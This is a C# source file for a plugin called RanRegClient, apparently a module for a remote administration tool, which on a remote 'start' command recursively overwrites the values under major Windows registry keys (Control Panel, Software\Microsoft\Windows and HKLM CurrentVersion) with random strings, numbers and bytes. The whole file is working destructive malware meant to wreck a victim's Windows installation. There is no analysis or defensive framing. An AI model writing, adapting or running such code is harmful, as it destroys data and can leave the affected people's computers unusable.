using Pulsar.Common.Plugins;
using Microsoft.Win32;
using System;
using System.Linq;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;

namespace Pulsar.Plugin.RanReg.Client
{
    public class RanRegPlugin : IUniversalPlugin
    {
        public string PluginId => "RanRegClient";
        public string Version => "1.0.0";
        public string[] SupportedCommands => new[] { "start" };

        private bool _isComplete = false;
        public bool IsComplete => _isComplete;

        public void Initialize(object initData)
        {
            // Plugin initialized
        }

        public PluginResult ExecuteCommand(string command, object parameters)
        {
            switch (command)
            {
                case "start":
                    return StartRanReg(parameters);
                default:
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"Unknown command: {command}",
                        ShouldUnload = true
                    };
            }
        }

        private PluginResult StartRanReg(object parameters)
        {
            try
            {
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        RandomizeVisualRegistry();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[RanRegPlugin] Error: " + ex.Message);
                    }
                    finally
                    {
                        _isComplete = true;
                    }
                });

                return new PluginResult
                {
                    Success = true,
                    Message = "Registry randomization started.",
                    ShouldUnload = false
                };
            }
            catch (Exception ex)
            {
                return new PluginResult
                {
                    Success = false,
                    Message = $"Error: {ex.Message}",
                    ShouldUnload = true
                };
            }
        }

        private void RandomizeVisualRegistry()
        {
            string[] paths =
            {
                @"HKEY_CURRENT_USER\Control Panel",
                @"HKEY_CURRENT_USER\Software\Microsoft\Windows",
                @"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
            };

            foreach (string path in paths)
            {
                try
                {
                    using (RegistryKey key = OpenRegistryPath(path))
                    {
                        if (key != null)
                        {
                            RandomizeRegistryKey(key);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[RanRegPlugin] Failed {path}: {ex.Message}");
                }
            }
        }

        private void RandomizeRegistryKey(RegistryKey key)
        {
            try
            {
                foreach (string valueName in key.GetValueNames())
                {
                    object value = key.GetValue(valueName);
                    RegistryValueKind kind = key.GetValueKind(valueName);

                    object newValue = GenerateRandomValue(kind, value);
                    if (newValue != null)
                        key.SetValue(valueName, newValue, kind);
                }

                foreach (string subKeyName in key.GetSubKeyNames())
                {
                    try
                    {
                        using (RegistryKey subKey = key.OpenSubKey(subKeyName, writable: true))
                        {
                            if (subKey != null)
                            {
                                RandomizeRegistryKey(subKey);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[RanRegPlugin] Failed subkey {subKeyName}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[RanRegPlugin] Error in RandomizeRegistryKey: {ex.Message}");
            }
        }

        private RegistryKey OpenRegistryPath(string fullPath)
        {
            string[] parts = fullPath.Split('\\');
            string hiveName = parts[0];
            string subPath = string.Join("\\", parts.Skip(1));

            RegistryKey baseKey = null;
            switch (hiveName.ToUpperInvariant())
            {
                case "HKEY_CURRENT_USER":
                    baseKey = Registry.CurrentUser;
                    break;
                case "HKEY_LOCAL_MACHINE":
                    baseKey = Registry.LocalMachine;
                    break;
                case "HKEY_CLASSES_ROOT":
                    baseKey = Registry.ClassesRoot;
                    break;
                case "HKEY_USERS":
                    baseKey = Registry.Users;
                    break;
                case "HKEY_CURRENT_CONFIG":
                    baseKey = Registry.CurrentConfig;
                    break;
                default:
                    baseKey = null;
                    break;
            }


            return baseKey?.OpenSubKey(subPath, writable: true);
        }

        private object GenerateRandomValue(RegistryValueKind kind, object originalValue)
        {
            Random rnd = new Random(Guid.NewGuid().GetHashCode());

            switch (kind)
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return RandomString(rnd.Next(4, 12), rnd);
                case RegistryValueKind.DWord:
                    return rnd.Next(int.MinValue, int.MaxValue);
                case RegistryValueKind.QWord:
                    return (long)rnd.Next(int.MinValue, int.MaxValue) << 32 | (uint)rnd.Next();
                case RegistryValueKind.Binary:
                    byte[] data = new byte[rnd.Next(2, 32)];
                    rnd.NextBytes(data);
                    return data;
                case RegistryValueKind.MultiString:
                    return new[] { RandomString(6, rnd), RandomString(8, rnd) };
                default:
                    return originalValue;
            }
        }

        private string RandomString(int length, Random rnd)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var sb = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                sb.Append(chars[rnd.Next(chars.Length)]);
            return sb.ToString();
        }

        public void Cleanup()
        {
            _isComplete = true;
        }
    }
}
